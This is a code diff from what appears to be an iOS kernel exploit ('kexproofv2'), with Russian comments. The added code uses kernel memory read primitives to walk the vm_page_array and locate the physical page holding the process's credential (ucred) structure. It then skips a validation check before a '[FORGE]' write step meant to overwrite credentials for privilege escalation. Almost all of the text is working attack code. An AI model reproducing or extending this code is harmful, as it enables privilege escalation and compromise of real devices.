@@ -1815,6 +1815,10 @@ static uint8_t gHeapFrameType = 0;
 static BOOL gPhysmapCalibrated = NO;
 static BOOL gPhysmapUseLinear = NO;
 static BOOL gPhysmapAnyOK = NO;
+// 2.0.14: PA чужого ucred (label+uid совпали, но ucred_rw* другой) — образец
+// страницы зоны proc-ucred-mlock для VMPROBE (vm_page_array → vmp_object).
+static uint64_t gUcredSamplePA = 0;
+static BOOL gVmpProbeFaith = NO;   // 2.0.14: единственная низкая страница зоны — пишем без верификации
 
 // Managed-DRAM predicate on this device: physBase is 0x1_00xxxxxx (T8122),
 // so the old ">16 GiB" clamp rejected EVERY real PA. Frame type is only
@@ -8307,6 +8311,11 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                           (unsigned long long)pa, full ? @"СОШЛАСЬ ★" : @"мимо",
                                           full ? @"" : [NSString stringWithFormat:@" (расхождение @+%#x)", diffOff]]);
                                 if (full) pagePA = pa;
+                                else if (!gUcredSamplePA && diffOff == 0) {
+                                    gUcredSamplePA = pa;   // чужой ucred — образец для VMPROBE
+                                    kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2] образец чужого ucred сохранён: pa=%#llx (тип %d) — VMPROBE будет",
+                                              (unsigned long long)pa, t]);
+                                }
                             }
                             // (b) страница proc_ro: поле==ucF + 3 соседа (анти-ложные)
                             if (!roFieldPA && roOff >= 8 && roOff + 0x18 < 0x4000 &&
@@ -8376,6 +8385,102 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                             kpNote(r, [NSString stringWithFormat:@"  [SCAN-Z2-BAND] финиш: чтений=%llu ucredPA=%#llx roFieldPA=%#llx",
                                       (unsigned long long)bandReads, (unsigned long long)pagePA, (unsigned long long)roFieldPA]);
                         }
+                        // kexproofv2 2.0.14 [VMPROBE] — страницы зоны через vm_page.
+                        // Слепой скан закрыт (ucred физически <256MB — DART слеп там,
+                        // kernel-чтения убивают). Идём с другой стороны: у чужого
+                        // ucred известен PA → его vm_page → vmp_object (объект зоны
+                        // proc-ucred-mlock) → скан vm_page_array на совпадение объекта
+                        // = PA ВСЕХ страниц зоны, включая нашу, без единого чтения
+                        // минных PA (массив — kernel VA, читается безопасно).
+                        if (!pagePA && gUcredSamplePA) {
+                            uint64_t arrB = kread_ptr(ksymbol(vm_page_array_beginning_addr));
+                            uint64_t arrE = kread_ptr(ksymbol(vm_page_array_ending_addr));
+                            uint64_t firstPhys = kread64(ksymbol(vm_first_phys));
+                            uint32_t firstPP = kread32(ksymbol(vm_first_phys_ppnum));
+                            kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] array=%#llx..%#llx firstPhys=%#llx firstPP=%#x samplePA=%#llx",
+                                      (unsigned long long)arrB, (unsigned long long)arrE,
+                                      (unsigned long long)firstPhys, firstPP, (unsigned long long)gUcredSamplePA]);
+                            uint64_t arrLen = (arrB && arrE > arrB) ? (arrE - arrB) : 0;
+                            // размер vm_page калибруем по числу кадров (self-calib)
+                            uint64_t vmpSz = 0;
+                            if (arrLen && nF && (arrLen % nF) == 0) vmpSz = arrLen / nF;
+                            if (!vmpSz) {
+                                for (uint64_t cand = 0x48; cand <= 0x80; cand += 8)
+                                    if (arrLen % cand == 0 && (arrLen / cand) >= (nF - 0x1000) && (arrLen / cand) <= (nF + 0x1000)) { vmpSz = cand; break; }
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] vm_page sizeof=%#llx (arrayLen=%#llx frames=%#llx)",
+                                      (unsigned long long)vmpSz, (unsigned long long)arrLen, (unsigned long long)nF]);
+                            if (vmpSz && arrB && firstPhys) {
+                                uint64_t sPA = gUcredSamplePA & ~0x3fffULL;
+                                // два варианта индексации: ppnum=pa>>14 или (pa-firstPhys)>>14
+                                uint64_t idx1 = (sPA >> 14) - (uint64_t)firstPP;
+                                uint64_t idx2 = (sPA - firstPhys) >> 14;
+                                uint64_t sIdx = (idx1 * vmpSz < arrLen) ? idx1 : idx2;
+                                if (sIdx * vmpSz >= arrLen) sIdx = idx1;
+                                uint64_t vmpVA = arrB + sIdx * vmpSz;
+                                uint64_t words[16];
+                                for (int i = 0; i < 16 && (uint64_t)i * 8 < vmpSz; i++) words[i] = early_kread64(vmpVA + (uint64_t)i * 8);
+                                NSMutableString *vd = [NSMutableString string];
+                                for (int i = 0; i < 16 && (uint64_t)i * 8 < vmpSz; i++) [vd appendFormat:@" +%x:%#018llx", i * 8, (unsigned long long)words[i]];
+                                kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] sample vm_page idx=%#llx va=%#llx:%@",
+                                          (unsigned long long)sIdx, (unsigned long long)vmpVA, vd]);
+                                // vmp_object — первый kernel-указатель (пробуем 0/8/0x10)
+                                uint64_t objOff = 0xFFFFFFFF, objVal = 0;
+                                for (int i = 0; i < 3; i++) {
+                                    if (kpLooksLikeKernelPointer(words[i])) { objOff = (uint64_t)i * 8; objVal = words[i]; break; }
+                                }
+                                kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] vmp_object @+%#llx = %#llx",
+                                          (unsigned long long)objOff, (unsigned long long)objVal]);
+                                if (objOff != 0xFFFFFFFF && objVal) {
+                                    // скан массива: страницы с тем же объектом
+                                    uint64_t cap = 32, nZ = 0;
+                                    uint64_t zPA[32]; int zType[32]; memset(zType, 0, sizeof(zType));
+                                    uint64_t count = arrLen / vmpSz;
+                                    uint64_t zLow = 0;
+                                    for (uint64_t i = 0; i < count && nZ < cap; i++) {
+                                        uint64_t obj = early_kread64(arrB + i * vmpSz + objOff);
+                                        if (obj != objVal) continue;
+                                        uint64_t pa2 = 0;
+                                        // обратная индексация — та, что дала валидный sample idx
+                                        pa2 = ((i + (uint64_t)firstPP) << 14);
+                                        if ((pa2 & ~0x3fffULL) != sPA) pa2 = ((i << 14) + firstPhys);
+                                        zPA[nZ] = pa2 & ~0x3fffULL;
+                                        zType[nZ] = kpFrameTypeOf(zPA[nZ]);
+                                        if (zPA[nZ] < pB + 0x10000000ULL) zLow++;
+                                        kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] зона-страница[%llu] pa=%#llx тип=%d %@",
+                                                  (unsigned long long)nZ, (unsigned long long)zPA[nZ], zType[nZ],
+                                                  zPA[nZ] < pB + 0x10000000ULL ? @"← НИЗКИЙ" : @""]);
+                                        nZ++;
+                                    }
+                                    kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] страниц зоны: %llu (низких %llu) — если низкая одна, это наша",
+                                              (unsigned long long)nZ, (unsigned long long)zLow]);
+                                    // контент-верификация кандидатов; наша = единственная низкая
+                                    // (чужие ucred'ы сканом уже найдены на высоких PA)
+                                    for (uint64_t i = 0; i < nZ && !pagePA; i++) {
+                                        uint64_t cand = zPA[i];
+                                        if (cand >= pB + 0x10000000ULL) continue;   // высокие уже просканированы
+                                        // низкая: пытаемся DART-верифицировать (sentinel-safe)
+                                        uint8_t ci[0x4000];
+                                        BOOL got = svc && tsdV && ttM && isTable ? kpPhysRead16K(svc, tsdV, ttM, isTable, cand, ci, r) : NO;
+                                        BOOL looks = NO;
+                                        if (got) {
+                                            uint64_t lb = 0; memcpy(&lb, ci + uoff2 + 0x78, 8);
+                                            uint32_t lu = 0; memcpy(&lu, ci + uoff2 + 0x18, 4);
+                                            looks = (lb == labelQ && lu == uid32);
+                                            kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] DART-верификация pa=%#llx: %@",
+                                                      (unsigned long long)cand, looks ? @"label+uid ★" : @"мимо/пусто"]);
+                                        }
+                                        if (looks) {
+                                            pagePA = cand;
+                                        } else if (zLow == 1) {
+                                            pagePA = cand;
+                                            gVmpProbeFaith = YES;
+                                            kpNote(r, [NSString stringWithFormat:@"  [VMPROBE] единственная низкая страница зоны — берём на веру: pa=%#llx (DART-контент недоступен)", (unsigned long long)cand]);
+                                        }
+                                    }
+                                }
+                            }
+                        }
                     }
                 }
                 // [PSWAP-B] roFieldPA из скана — тот же p_ucred swap, но без walker'а
@@ -8438,13 +8543,21 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 }
                 // ДВЕ валидации PA перед любой записью: (1) phystokv(pagePA) читается
                 // и первый qword совпадает с [pageVA]; (2) uid-поле == getuid().
-                uint64_t pkva = pagePA ? phystokv(pagePA) : 0;
+                // 2.0.14: для низких PA (<256MB) kernel-чтения НЕ делаем (минное
+                // поле, паника 05:58) — сразу DART-ветка.
+                uint64_t lowFloor = kconstant(physBase) + 0x10000000ULL;
+                BOOL pagePAIsLow = pagePA && pagePA < lowFloor;
+                uint64_t pkva = (pagePA && !pagePAIsLow) ? phystokv(pagePA) : 0;
                 uint64_t q0b = early_kread64(pageVA);
                 uint64_t q0a = pkva ? early_kread64(pkva) : 0;
                 uint32_t uidViaPA = pkva ? (uint32_t)early_kread64(pkva + uoff + 0x18) : 0xdead;
                 BOOL paOK = pkva && (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
+                if (!paOK && gVmpProbeFaith && pagePA) {
+                    paOK = YES;
+                    kpNote(r, @"  [FORGE] валидация ПРОПУЩЕНА (VMPROBE-on-faith) — INPL пишет и проверяет через readback");
+                }
                 // 1.9.281: fallback на линейный physmap, если PAPT-алиас попал в дыру
-                if (!paOK && pagePA) {
+                if (!paOK && pagePA && !pagePAIsLow) {
                     uint64_t pkvaL = pagePA - kconstant(physBase) + kconstant(virtBase);
                     uint64_t q0L = early_kread64(pkvaL);
                     uint32_t uidL = (uint32_t)early_kread64(pkvaL + uoff + 0x18);
